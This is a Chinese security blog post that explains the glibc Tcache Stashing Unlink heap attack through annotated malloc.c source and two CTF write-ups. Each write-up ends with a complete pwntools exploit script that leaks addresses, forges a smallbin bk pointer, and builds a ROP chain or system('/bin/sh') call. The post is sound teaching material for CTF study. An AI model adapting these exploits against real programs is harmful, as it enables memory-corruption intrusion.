# Tcache Stashing Unlink Attack利用思路

阅读量 **1092068**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-02-13 16:30:14

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01f0e8ebb8128ab9f0.jpg)

## 0x00 写在前面

`Tcache Stashing Unlink Attack`这个攻击名词是我第一次见到的，因此写一篇文章以记录思路。

2020/03/13 更新：`Tcache Stashing Unlink
Attack`有了更深的利用方式，从本来的任意地址写一个指定值或可扩大到任意地址分配chunk进而做到任意地址读写。

## 0x01 前置知识

### House of Lore Attack

`Tcache Stashing Unlink Attack`也是利用了`Smallbin`的相关分配机制进行的攻击，因此此处先对`House of
Lore`这一攻击技术做一个简要的介绍。

#### 攻击目标

分配任意指定位置的 chunk，从而修改任意地址的内存。（任意地址写）

#### 攻击前提

能控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。

#### 攻击原理

##### 漏洞源码（Glibc2.29 malloc.c line3639）

⚠️：代码中的英文注释为源代码自带，中文注释为分析，Tcache部分不做分析。

    
    
      /*
        If a small request, check regular bin.  Since these "smallbins"
        hold one size each, no searching within bins is necessary.
        (For a large request, we need to wait until unsorted chunks are
        processed to find best fit. But for small ones, fits are exact
        anyway, so we can check now, which is faster.)
    */
    if (in_smallbin_range (nb))
    {
        idx = smallbin_index (nb);
        // 获取 small bin 的索引
        bin = bin_at (av, idx);
        // 先执行 victim = last(bin)，获取 small bin 的最后一个 chunk
        // 若结果 victim = bin ，那说明该 bin 为空。
        if ( ( victim = last (bin) ) != bin )
        {
            // 获取 small bin 中倒数第二个 chunk 。
            bck = victim->bk;
            // 检查 bck->fd 是不是 victim，防止伪造
            if ( __glibc_unlikely( bck->fd != victim ) )
                malloc_printerr ("malloc(): smallbin double linked list corrupted");
            // 设置 victim 对应的 inuse 位
            set_inuse_bit_at_offset (victim, nb);
            // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来
            bin->bk = bck;
            bck->fd = bin;
            // 如果不是 main_arena，设置对应的标志
            if (av != &main_arena)
                set_non_main_arena (victim);
            //执行更为细致的检查
            check_malloced_chunk (av, victim, nb);
    #if USE_TCACHE //如果程序启用了Tcache
            /* While we're here, if we see other chunks of the same size,
            stash them in the tcache.  */
            size_t tc_idx = csize2tidx (nb);
            if (tcache && tc_idx < mp_.tcache_bins)
            {
                mchunkptr tc_victim;
                /* While bin not empty and tcache not full, copy chunks over.  */
                while ( tcache->counts[tc_idx] < mp_.tcache_count
                       && (tc_victim = last (bin) ) != bin)
                {
                    if (tc_victim != 0)
                    {
                        bck = tc_victim->bk;
                        set_inuse_bit_at_offset (tc_victim, nb);
                        if (av != &main_arena)
                            set_non_main_arena (tc_victim);
                        bin->bk = bck;
                        bck->fd = bin;
                        tcache_put (tc_victim, tc_idx);
                    }
                }
            }
    #endif
            // 将申请到的 chunk 转化为对应的 mem 状态
            void *p = chunk2mem (victim);
            // 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff
            alloc_perturb (p, bytes);
            return p;
        }
    }

可以看到，在Glibc2.29中也没有对`Small Bin`的`malloc`做更多的保护~

##### 漏洞分析

    
    
    // 获取 small bin 中倒数第二个 chunk 。
    bck = victim->bk;
    // 检查 bck->fd 是不是 victim，防止伪造
    if ( __glibc_unlikely( bck->fd != victim ) )
        malloc_printerr ("malloc(): smallbin double linked list corrupted");
    // 设置 victim 对应的 inuse 位
    set_inuse_bit_at_offset (victim, nb);
    // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来
    bin->bk = bck;
    bck->fd = bin;

也就是说，如果此处我们能够控制 small bin 的最后一个 chunk 的 bk 为我们想要写入的内存地址，并且保证`__glibc_unlikely(
bck->fd != victim )`检查通过就可以在small bin中加入我们想加入的Chunk，进而在内存的任意地址分配一个Chunk！

### Tcache Stashing Unlink Attack

#### 攻击目标

  1. 向任意指定位置写入指定值。

  2. 向任意地址分配一个Chunk。

#### 攻击前提

  1. 能控制 Small Bin Chunk 的 bk 指针。

  2. 程序可以越过Tache取Chunk。(使用calloc即可做到)

  3. 程序至少可以分配两种不同大小且大小为unsorted bin的Chunk。

#### 攻击原理

我们首先分析`House of Lore Attack`中所忽视的Tcache相关代码。

    
    
    #if USE_TCACHE //如果程序启用了Tcache
            /* While we're here, if we see other chunks of the same size,
            stash them in the tcache.  */
            //遍历整个smallbin，获取相同size的free chunk
            size_t tc_idx = csize2tidx (nb);
            if (tcache && tc_idx < mp_.tcache_bins)
            {
                mchunkptr tc_victim;
                /* While bin not empty and tcache not full, copy chunks over.  */
                //判定Tcache的size链表是否已满，并且取出smallbin的末尾Chunk。
                //验证取出的Chunk是否为Bin本身（Smallbin是否已空）
                while ( tcache->counts[tc_idx] < mp_.tcache_count
                       && (tc_victim = last (bin) ) != bin)
                {
                    //如果成功获取了Chunk
                    if (tc_victim != 0)
                    {
                        // 获取 small bin 中倒数第二个 chunk 。
                        bck = tc_victim->bk;
                        //设置标志位
                        set_inuse_bit_at_offset (tc_victim, nb);
                        // 如果不是 main_arena，设置对应的标志
                        if (av != &main_arena)
                            set_non_main_arena (tc_victim);
                        //取出最后一个Chunk
                        bin->bk = bck;
                        bck->fd = bin;
                        //将其放入到Tcache中
                        tcache_put (tc_victim, tc_idx);
                    }
                }
            }
    #endif

此处我们发现了一个很关键的情况！我们在此处没有经过`House of Lore`中必须经过的检查：

    
    
    // 检查 bck->fd 是不是 victim，防止伪造
    if ( __glibc_unlikely( bck->fd != victim ) )
        malloc_printerr ("malloc(): smallbin double linked list corrupted");

但是此处又有了矛盾的地方！

**首先，在引入Tcache后，Tcache中的Chunk拥有绝对优先权，我们不能越过Tcache向SmallBin中填入Chunk，也不能越过Tcache从SmallBin中取出Chunk。（除非Tcache已经处于FULL状态）**

然后，我们如果要在这里启动攻击，那么要求`SmallBin`中至少有两个Chunk(否则无法进入While中的if语句块)，
**同时要求Tcache处于非空状态。**

那样就产生了矛盾，导致这个漏洞看似无法利用。

但是`calloc`函数有一个很有趣的特性，它不会从`Tcache`拿`Chunk`，因此可以越过第一条矛盾“不能越过`Tcache`从`SmallBin`中取出`Chunk`”。

然后是`Unsorted Bin`的 **`last remainder`** 基址，当申请的Chunk大于`Unsorted
Bin`中Chunk的大小且其为`Unsorted Bin`中的唯一`Chunk`时，该`Chunk`不会进入`Tcache`。

同时，我们来分析`tcache_put`函数

    
    
    static __always_inline void tcache_put (mchunkptr chunk, size_t tc_idx)
    {
      tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
      assert (tc_idx < TCACHE_MAX_BINS);
    ​
      /* Mark this chunk as "in the tcache" so the test in _int_free will
         detect a double free.  */
      e->key = tcache;
    ​
      e->next = tcache->entries[tc_idx];
      tcache->entries[tc_idx] = e;
      ++(tcache->counts[tc_idx]);
    }

可以发现，`tcache_put`函数没有做任何的安全检查。

那么，当Tcache存在两个以上的空位时，程序会将我们的fake chunk置入Tcache。

## 0x02 以BUUOJ-2020 新春红包题-3为例

### 题目分析

![](https://img.lhyerror404.cn/error404/2020-02-01-132130.png)

除了Canary保护外，保护全部开启。

![](https://img.lhyerror404.cn/error404/2020-02-01-132240.png)

题目很明显， **在free后没有将指针置零，存在Use-After-Free漏洞** ，并且因为程序开启了Edit功能和Show功能，导致漏洞十分严重。

![](https://img.lhyerror404.cn/error404/2020-02-01-132739.png)

题目在分配`Chunk`时规定了大小，因此限制了我们对于`Large Bin Attack`的使用。

另外题目的分配函数使用了`calloc()`，`calloc()`会在申请`Chunk`后对其内部进行清零操作，并且`calloc()`不会从`Tcache
Bin`中取出堆块，那么我们直接将`Tcache Bin`填满就可以进行正常利用了。

程序在最后预留了后门函数，以供我们执行ROP链。

![](https://img.lhyerror404.cn/error404/2020-02-01-133018.png)

但是后门的启用需要满足三个条件

![](https://img.lhyerror404.cn/error404/2020-02-01-133236.png)

而`Back_door_heck`变量是一个大小为0x1000的Chunk。

![](https://img.lhyerror404.cn/error404/2020-02-01-133351.png)

### Tcache Bin的填充

首先，需要循环释放7个Chunk到Tcache Bin区域以填满Tcache以防止其干扰我们后续的利用。

    
    
    for i in range(7):
        creat(sh,15,4,'Chunk_15')
        delete(sh,15)

**同时为了之后我们使用`Tcache Stashing Unlink Attack`，我们需要先向0x100大小的Tcache
Bin释放6个Chunk，这样，在将我们伪造的Fake_chunk放入Tcache Bin区域时，Tcache
Bin区域将会填满，程序不会继续通过我们伪造的bk指针向后继续遍历。**

    
    
    for i in range(6):
        creat(sh,14,2,'Chunk_14')
        delete(sh,14)

### 泄露Heap地址及Libc地址

因为UAF漏洞的存在，我们只需要打印已经释放过的Tcache即可计算出Heap区域的首地址。

    
    
    show(sh,15)
    last_chunk_addr = get_address(sh,'We get last chunk address is ','','\x0A')
    heap_addr = last_chunk_addr - 0x26C0
    log.success('We get heap address is ' + str(hex(heap_addr)))

接下来继续分配一个`0x300`大小的Chunk，释放后它将进入`Unsorted Bin`,此时打印它的内容，将泄漏`Libc`基址。

⚠️：为防止`Top Chunk`合并，需要在最后额外申请一个Chunk。

    
    
    creat(sh,1,4,'Chunk_1')
    creat(sh,13,3,'Chunk_13')
    delete(sh,1)
    show(sh,1)
    libc_base = get_address(sh,'We leak main arena address is ','','\x0A') - 0x1E4CA0
    log.success('We get libc base address is ' + str(hex(libc_base)))

### 向Small Bin中加入两个Chunk

此时在`Unsorted
Bin`中已经有一个0x410大小的Chunk了，现在我们申请两个0x300大小的Chunk，程序会将0x100大小的Chunk放入`Small
Bin`中。

    
    
    creat(sh,13,3,'Chunk_13')
    creat(sh,13,3,'Chunk_13')
    

![](https://img.lhyerror404.cn/error404/2020-02-02-123511.png)

然后我们再次申请一个0x400的Chunk，释放，再申请一个0x300的Chunk，在Small Bin中再次加入一个大小为0x100的`Chunk`。

⚠️：为防止`Top Chunk`合并，需要在最后额外申请一个Chunk。

    
    
    creat(sh,2,4,'Chunk_2')
    creat(sh,13,4,'Chunk_13')
    delete(sh,2)
    creat(sh,13,3,'Chunk_13')
    creat(sh,13,3,'Chunk_13')
    

![](https://img.lhyerror404.cn/error404/2020-02-02-123610.png)

###

###  执行 Tcache Stashing Unlink Attack

现在SmallBin中的情况为：

    
    
    Small Bin: Chunk2 -> Chunk1

那么我们接下来若申请一个大小为`0xF0`的`Chunk`，程序仅会检查`Chunk2`的`fd`指针是否指向`Chunk1`。

在取出Chunk1后， **因为0x100的Tcache Bin还有1个空位，程序会遍历发现Chunk2满足大小条件并将其放入Tcache Bin中！**

我们若此时篡改`Chunk2`的`bk`指针指向`heap_addr+0x250+0x10+0x800-0x10`，程序就会在`heap_addr+0x250+0x10+0x800`的位置写入`main_arena`的地址，进而可以让我们进入后门函数。

    
    
    payload='\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x31E0)+p64(heap_addr+0x250+0x10+0x800-0x10)
    edit(sh,2,payload)

触发攻击

    
    
    creat(sh,3,2,'Chunk_3')

###

###  构造ROP链

经过检测，发现程序开启了SandBox。

![](https://img.lhyerror404.cn/error404/2020-02-05-083749.png)

那么我们采取`Open-Read-Write`的利用方式。

⚠️：Read函数的第一个参数文件描述符从0开始累加，程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，这样在程序中，每打开一个文件，文件描述符值从3开始累加。

因为我们无法获取PIE的值，于是选择从libc中寻找gadget。

![](https://img.lhyerror404.cn/error404/2020-02-05-093304.png)

至此，我们可以顺利的构造ROP链。

    
    
    ROP_chain  = '/flag\x00\x00\x00'
    ROP_chain += p64(pop_rdi_ret)
    ROP_chain += p64(file_name_addr)
    ROP_chain += p64(pop_rsi_ret)
    ROP_chain += p64(0)
    ROP_chain += p64(libc_base+libc.symbols['open'])
    ROP_chain += p64(pop_rdi_ret)
    ROP_chain += p64(3)
    ROP_chain += p64(pop_rsi_ret)
    ROP_chain += p64(flag_addr)
    ROP_chain += p64(pop_rdx_ret)
    ROP_chain += p64(0x40)
    ROP_chain += p64(libc_base+libc.symbols['read'])
    ROP_chain += p64(pop_rdi_ret)
    ROP_chain += p64(1)
    ROP_chain += p64(pop_rsi_ret)
    ROP_chain += p64(flag_addr)
    ROP_chain += p64(pop_rdx_ret)
    ROP_chain += p64(0x40)
    ROP_chain += p64(libc_base+libc.symbols['write'])

### Final Exploit

    
    
    from pwn import *
    import sys
    context.log_level='debug'
    context.arch='amd64'
    ​
    RedPacket_SoEasyPwn1=ELF('RedPacket_SoEasyPwn1')
    ​
    if context.arch == 'amd64':
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    elif context.arch == 'i386':
        libc=ELF("/lib/i386-linux-gnu/libc.so.6")
    ​
    def get_sh(other_libc = null):
        global libc
        if args['REMOTE']:
            if other_libc is not null:
                libc = ELF("./")
            return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./RedPacket_SoEasyPwn1")
    ​
    def get_address(sh,info=null,start_string=null,end_string=null,int_mode=False):
        sh.recvuntil(start_string)
        if int_mode :
            return_address=int(sh.recvuntil(end_string).strip(end_string),16)
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'\x00'))
        else:
            return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'\x00'))
        log.success(info+str(hex(return_address)))
        return return_address
    ​
    def get_flag(sh):
        # sh.recv()
        sh.sendline('ls')
        sh.recv()
        sh.sendline('cat /flag')
        return sh.recvline()
    ​
    def get_gdb(sh,stop=False):
        gdb.attach(sh)
        if stop :
            raw_input()
    ​
    def creat(sh,index,chunk_size_index,value):
        sh.recvuntil('Your input: ')
        sh.sendline('1')
        sh.recvuntil('Please input the red packet idx: ')
        sh.sendline(str(index))
        sh.recvuntil('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ')
        sh.sendline(str(chunk_size_index))
        sh.recvuntil('Please input content: ')
        sh.sendline(value)
    ​
    def delete(sh,index):
        sh.recvuntil('Your input: ')
        sh.sendline('2')
        sh.recvuntil('Please input the red packet idx: ')
        sh.sendline(str(index))
    ​
    def edit(sh,index,value):
        sh.recvuntil('Your input: ')
        sh.sendline('3')
        sh.recvuntil('Please input the red packet idx: ')
        sh.sendline(str(index))
        sh.recvuntil('Please input content: ')
        sh.sendline(value)
    ​
    def show(sh,index):
        sh.recvuntil('Your input: ')
        sh.sendline('4')
        sh.recvuntil('Please input the red packet idx: ')
        sh.sendline(str(index))
    ​
    if __name__ == "__main__":
        sh = get_sh()
        
    ​
        for i in range(7):
            creat(sh,15,4,'Chunk_15')
            delete(sh,15)
    ​
        for i in range(6):
            creat(sh,14,2,'Chunk_14')
            delete(sh,14)
    ​
    ​
        show(sh,15)
        last_chunk_addr = get_address(sh,'We get last chunk address is ','','\x0A')
        heap_addr = last_chunk_addr - 0x26C0
        log.success('We get heap address is ' + str(hex(heap_addr)))
    ​
        creat(sh,1,4,'Chunk_1')
        creat(sh,13,3,'Chunk_13')
        delete(sh,1)
        show(sh,1)
        libc_base = get_address(sh,'We leak main arena address is ','','\x0A') - 0x1E4CA0
        log.success('We get libc base address is ' + str(hex(libc_base)))
    ​
    ​
        creat(sh,13,3,'Chunk_13')
        creat(sh,13,3,'Chunk_13')
    ​
        creat(sh,2,4,'Chunk_2')
        creat(sh,13,4,'Chunk_13')
        delete(sh,2)
        creat(sh,13,3,'Chunk_13')
        creat(sh,13,3,'Chunk_13')
    ​
    ​
        payload='\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)
        edit(sh,2,payload)
    ​
        creat(sh,3,2,'Chunk_3')
    ​
    ​
        pop_rdi_ret = libc_base + 0x0000000000026542
        pop_rsi_ret = libc_base + 0x0000000000026f9e
        pop_rdx_ret = libc_base + 0x000000000012bda6
        file_name_addr = heap_addr + 0x0000000000004A40
        flag_addr = file_name_addr + 0x0000000000000200
        ROP_chain  = '/flag\x00\x00\x00'
        ROP_chain += p64(pop_rdi_ret)
        ROP_chain += p64(file_name_addr)
        ROP_chain += p64(pop_rsi_ret)
        ROP_chain += p64(0)
        ROP_chain += p64(libc_base+libc.symbols['open'])
        ROP_chain += p64(pop_rdi_ret)
        ROP_chain += p64(3)
        ROP_chain += p64(pop_rsi_ret)
        ROP_chain += p64(flag_addr)
        ROP_chain += p64(pop_rdx_ret)
        ROP_chain += p64(0x40)
        ROP_chain += p64(libc_base+libc.symbols['read'])
        ROP_chain += p64(pop_rdi_ret)
        ROP_chain += p64(1)
        ROP_chain += p64(pop_rsi_ret)
        ROP_chain += p64(flag_addr)
        ROP_chain += p64(pop_rdx_ret)
        ROP_chain += p64(0x40)
        ROP_chain += p64(libc_base+libc.symbols['write'])
    ​
        creat(sh,4,4,ROP_chain)
    ​
        leave_ret = libc_base + 0x0000000000058373
        sh.recvuntil('Your input: ')
        sh.sendline('666')
        sh.recvuntil('What do you want to say?')
        sh.sendline('A'*0x80 + p64(file_name_addr) + p64(leave_ret))
        
        sh.interactive()

## 0x04 以2020-XCTF-高校战疫赛 two_chunk为例

### 题目分析

![](https://p0.ssl.qhimg.com/t01f2b2d8651a6e1953.png)

程序使用了2.30的Libc，但是本题的相关利用与2.30新增的保护机制无关，因此我们使用libc2.29完成利用。

![](https://p0.ssl.qhimg.com/t01186b134ab312e021.png)

保护全部开启。

程序使用`Calloc`进行`Chunk`的分配，编辑函数仅能编辑一次，且编辑时可以溢出0x20字节。

### 向Small Bin中加入两个Chunk

首先`Creat(sh,0,0x188)`然后再`Creat(sh,1,0x300)`，这个`0x300`大小的`Chunk`是为了防止`Chunk`被`Top
Chunk`合并，这里我们将这个`Chunk`视为`Chunk 2`。堆内存情况如下：

    
    
    Chunk 0 (in use)(0x190)
    Chunk 2 (in use)(0x310)

紧接着释放`Chunk 0`，这个`Chunk`会被加入`Unsorted Bin`，再`Creat(sh,0,0xF0)`，程序会从`Chunk
0`中切割走`0x100`大小，这里我们将剩余的大小视为`Chunk 1`。堆内存情况如下：

    
    
    Chunk 0 (in use)(0x100)
    Chunk 1 (no use)(0x90 ) <- Unsorted Bin
    Chunk 2 (in use)(0x310)

之后我们释放`Chunk 0`,再次`Creat(sh,0,0x100)`，`Chunk 1`会被加入`Small Bin`。然后我们释放`Chunk
0`、`Chunk 1`。堆内存情况如下：

    
    
    Chunk 0 (no use)(0x110) <- Tcache Bin
    Chunk 1 (no use)(0x90 ) <- Small Bin
    Chunk 2 (no use)(0x310) <- Tcache Bin
    Chunk 3 (no use)(0x110) <- Chunk 0 <- Tcache Bin

之后我们`Creat(sh,0,0x188)`然后再`Creat(sh,1,0x300)`，这个`0x300`大小的`Chunk`是为了防止`Chunk`被`Top
Chunk`合并，这里我们将这个`Chunk`视为`Chunk 6`。堆内存情况如下：

    
    
    Chunk 0 (no use)(0x110) <- Tcache Bin
    Chunk 1 (no use)(0x90 ) <- Small Bin
    Chunk 2 (no use)(0x310) <- Tcache Bin
    Chunk 3 (no use)(0x110) <- Chunk 0 <- Tcache Bin
    Chunk 4 (in use)(0x190)
    Chunk 6 (in use)(0x310) 

紧接着释放`Chunk 4`，这个`Chunk`会被加入`Unsorted Bin`，再`Creat(sh,0,0xF0)`，程序会从`Chunk
4`中切割走`0x100`大小，这里我们将剩余的大小视为`Chunk 5`。堆内存情况如下：

    
    
    Chunk 0 (no use)(0x110) <- Tcache Bin
    Chunk 1 (no use)(0x90 ) <- Small Bin
    Chunk 2 (no use)(0x310) <- Tcache Bin
    Chunk 3 (no use)(0x110) <- Chunk 0 <- Tcache Bin
    Chunk 4 (in use)(0x100)
    Chunk 5 (no use)(0x90 ) <- Unsorted Bin
    Chunk 6 (in use)(0x310) 

之后我们释放`Chunk 6`,再次`Creat(sh,0,0x100)`，`Chunk 5`会被加入`Small Bin`。堆内存情况如下：

    
    
    Chunk 0 (no use)(0x110) <- Tcache Bin
    Chunk 1 (no use)(0x90 ) <- Small Bin
    Chunk 2 (no use)(0x310) <- Tcache Bin
    Chunk 3 (no use)(0x110) <- Chunk 0 <- Tcache Bin
    Chunk 4 (in use)(0x100)
    Chunk 5 (no use)(0x90 ) <- Chunk 1 <- Small Bin
    Chunk 6 (in use)(0x310) <- Chunk 2 <- Tcache Bin
    Chunk 7 (in use)(0x100)

⚠️：此处我们不使用释放`Chunk 4`的原因是，此时`Chunk 0`恰好指向`Chunk
4`，而`edit`存在一个溢出写，那么我们就可以篡改`Chunk5`的`Size`域了。

至此，我们向`Small Bin`中加入了两个`0x90`大小的Chunk。

### 执行 Tcache Stashing Unlink Attack

现在SmallBin中的情况为：

    
    
    Small Bin: Chunk5 -> Chunk1

那么我们接下来若申请一个大小为`0x88`的`Chunk`，程序仅会检查`Chunk5`的`fd`指针是否指向`Chunk1`。

在取出`Chunk 1`后， **因为0x90的Tcache
Bin还有2个空位，程序会首先遍历发现Chunk5满足大小条件并将其作为参数调用`tcache_put`。**

    
    
    while ( tcache->counts[tc_idx] < mp_.tcache_count && (tc_victim = last (bin) ) != bin)
    {
        if (tc_victim != 0)
        {
            bck = tc_victim->bk;
            ...
            bin->bk = bck;
            bck->fd = bin;
            tcache_put (tc_victim, tc_idx);
        }
    }

若此时，我们篡改了`Chunk 5`的`bk`指针为`Fake_Chunk`的地址(假设为0x12345678)，那么程序接下来会将`Small
bin`的`bk`指针置为`0x12345678`，并且在`0x12345678 ->
fd`的位置写入`bin`的地址，也就是`main_arena`的地址。接下来，由于 **因为0x90的Tcache
Bin仍有1个空位，程序会发现`Fake_Chunk`满足大小条件并将其作为参数调用`tcache_put`。**

此时！程序就会将我们的`Fake_Chunk`也置入`Tcache Bin`，我们只要能将其从`Tcache Bin`取回，就可以做任意地址写了。

⚠️：此处我们仍要注意一点，在将`Fake_Chunk`也置入`Tcache
Bin`之前，程序会将`bin`的地址，也就是`main_arena`的地址写入`Fake_Chunk->bk->fd`的位置，这里我们一定要确保`Fake_Chunk->bk->fd`是可写的！那么此处我们使用我们索性将buf的前部统一置为buf的位置+0x20。

那么我们对`Chunk 4`进行edit操作，注意，此处的`Chunk
4`的`index`为0。这里我们选择将chunk分配到buf的位置，以便我们能执行任意命令。

![](https://p0.ssl.qhimg.com/t01e93759bd8b5c586c.png)

    
    
    edit(sh,0,'\x00' * 0xF0 + p64(0)+ p64(0x91) + p64(heap_address + 0x1310) + p64(0x23333000 - 0x10))
    delete(sh,1)
    creat(sh,1,0x88)

![](https://p4.ssl.qhimg.com/t0155fb1f2d9c6ccc6d.png)

接下来我们使用`Leave_end_message`功能即可取回`Fake_chunk`。

### 泄露Libc Address & 获取Shell

首先我们先泄露Libc地址，还记得之前说过的吗，在将`Fake_Chunk`也置入`Tcache
Bin`之前，程序会将`bin`的地址，也就是`main_arena`的地址写入`Fake_Chunk->bk->fd`的位置，我们已经将`Fake_Chunk->bk`篡改为了`buf的位置+0x20`,此时，`Fake_Chunk->bk->fd`恰好为`buf的位置+0x30`，也就是message的位置！

![](https://p0.ssl.qhimg.com/t015893e97ba2c474c4.png)

那么我们只要使用`Show_name_message`功能即可泄露`main_arena`的地址，进而计算libc基址。

然后我们使用`Leave_end_message`功能取回`Fake_chunk`即可执行任意libc函数。

### Final Exploit

    
    
    from pwn import *
    import traceback
    import sys
    context.log_level='debug'
    context.arch='amd64'
    # context.arch='i386'
    ​
    twochunk=ELF('./twochunk', checksec = False)
    ​
    if context.arch == 'amd64':
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
    elif context.arch == 'i386':
        try:
            libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
        except:
            libc=ELF("/lib32/libc.so.6", checksec = False)
    ​
    def get_sh(Use_other_libc = False , Use_ssh = False):
        global libc
        if args['REMOTE'] :
            if Use_other_libc :
                libc = ELF("./", checksec = False)
            if Use_ssh :
                s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
                return s.process("./twochunk")
            else:
                return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./twochunk")
    ​
    def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if int_mode :
            return_address = int(sh.recvuntil(end_string,drop=True),16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].ljust(8,'\x00'))
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string,drop=True).ljust(8,'\x00'))
        else:
            return_address=u32(sh.recvuntil(end_string,drop=True).ljust(4,'\x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            log.success(info + str(hex(return_address)))
        return return_address
    ​
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    ​
    def get_gdb(sh,gdbscript=None,stop=False):
        gdb.attach(sh,gdbscript=gdbscript)
        if stop :
            raw_input()
    ​
    def Multi_Attack():
        # testnokill.__main__()
        return
    ​
    def creat(sh,index,chunk_size):
        sh.recvuntil('choice: ')
        sh.send('1')
        sh.recvuntil('idx: ')
        sh.send(str(index))
        sh.recvuntil('size: ')
        sh.send(str(chunk_size))
    ​
    def delete(sh,index):
        sh.recvuntil('choice: ')
        sh.send('2')
        sh.recvuntil('idx: ')
        sh.send(str(index))
    ​
    def show(sh,index):
        sh.recvuntil('choice: ')
        sh.send('3')
        sh.recvuntil('idx: ')
        sh.send(str(index))
    ​
    def edit(sh,index,value):
        sh.recvuntil('choice: ')
        sh.send('4')
        sh.recvuntil('idx: ')
        sh.send(str(index))
        sh.recvuntil('content: ')
        sh.send(value)
    ​
    def Show_name_message(sh):
        sh.recvuntil('choice: ')
        sh.send('5')
    ​
    def Leave_end_message(sh,value):
        sh.recvuntil('choice: ')
        sh.send('6')
        sh.recvuntil('leave your end message: ')
        sh.send(value)
    ​
    def Back_Door(sh):
        sh.recvuntil('choice: ')
        sh.send('7')
    ​
    def Attack(sh=None,ip=None,port=None):
        if ip != None and port !=None:
            try:
                sh = remote(ip,port)
            except:
                return 'ERROR : Can not connect to target server!'
        try:
            # Your Code here
            sh.recvuntil('leave your name: ')
            sh.send(p64(0x23333000 + 0x20) * 6)
            sh.recvuntil('leave your message: ')
            sh.sendline('A' * 0x30)
    ​
            creat(sh,0,233)
            delete(sh,0)
            creat(sh,0,233)
            delete(sh,0)
            creat(sh,0,23333)
            show(sh,0)
    ​
            heap_address = get_address(sh,info='We get heap address is ',address_len=8,offset=-0x260)
            sh.send('2')
            sh.recvuntil('idx: ')
            sh.send(str(0))
    ​
            # for i in range(6):
            #     creat(sh,0,0x90)
            #     delete(sh,0)
            for i in range(5):
                creat(sh,0,0x88)
                delete(sh,0)
    ​
            for i in range(7):
                creat(sh,0,0x188)
                delete(sh,0)
            
            creat(sh,0,0x188)
            creat(sh,1,0x300)
            delete(sh,0)
            creat(sh,0,0xF0)
            delete(sh,0)
    ​
            creat(sh,0,0x100)
            delete(sh,0)
            delete(sh,1)
    ​
            creat(sh,0,0x188)
            creat(sh,1,0x300)
            delete(sh,0)
            creat(sh,0,0xF0)
            delete(sh,1)
    ​
            creat(sh,1,0x100)
    ​
            edit(sh,0,'\x00' * 0xF0 + p64(0)+ p64(0x91) + p64(heap_address + 0x1310) + p64(0x23333000 - 0x10))
    ​
            delete(sh,1)
            creat(sh,1,0x88)
    ​
            Show_name_message(sh)
            libc.address = get_address(sh,info='We get libc address is ',start_string='message: ',end_string='\n',offset=-0x1E4D20)
    ​
            Leave_end_message(sh,p64(libc.symbols['system'])+p64(libc.search('/bin/sh').next()) * 10)
            Back_Door(sh)
            sh.interactive()
            flag=get_flag(sh)
            sh.close()
            return flag
        except Exception as e:
            traceback.print_exc()
            sh.close()
            return 'ERROR : Runtime error!'
    ​
    if __name__ == "__main__":
        sh = get_sh()
        flag = Attack(sh=sh)
        log.success('The flag is ' + re.search(r'flag{.+}',flag).group())

## 0x05 参考链接

[CTF-wiki House of Lore](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_lore-zh/)

[HITCON CTF 2019 Quals — One Punch Man –
berming](https://medium.com/@ktecv2000/hitcon-ctf-2019-quals-one-punch-man-pwn-292pts-3e94eb3fd312)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **ERROR404** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/198173](/post/id/198173)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Tcache Stashing Unlink Attack](/tag/Tcache Stashing Unlink Attack)

 **+1** __5赞

 __收藏

![](https://p5.ssl.qhimg.com/t01fc6ae8fa56997fe6.jpg) ERROR404

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

